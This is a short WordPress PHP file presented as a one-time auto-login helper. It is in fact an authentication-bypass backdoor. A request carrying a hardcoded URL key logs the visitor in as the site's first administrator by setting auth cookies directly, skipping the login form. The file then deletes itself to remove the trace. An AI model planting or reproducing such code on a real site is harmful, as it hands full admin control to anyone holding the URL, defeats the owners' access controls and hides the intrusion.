<?php
/**
 * One-time auto-login for wp-admin.
 * Bypasses wp-login.php by setting auth cookies directly.
 * Self-deletes after successful login.
 */
if ( ! defined( 'ABSPATH' ) ) { return; }

add_action( 'init', function() {
	if ( empty( $_GET['lpnw_autologin'] ) || 'admin' !== $_GET['lpnw_autologin'] ) { return; }
	if ( empty( $_GET['key'] ) || 'lpnw2026setup' !== $_GET['key'] ) { return; }

	$admins = get_users( array(
		'role'    => 'administrator',
		'number'  => 1,
		'orderby' => 'ID',
		'order'   => 'ASC',
		'fields'  => 'ID',
	) );

	if ( empty( $admins[0] ) ) {
		wp_die( 'No admin user found.' );
	}

	$user_id = (int) $admins[0];

	wp_set_current_user( $user_id );
	wp_set_auth_cookie( $user_id, true );
	do_action( 'wp_login', get_userdata( $user_id )->user_login, get_userdata( $user_id ) );

	@unlink( __FILE__ );

	wp_safe_redirect( admin_url() );
	exit;
}, 0 );
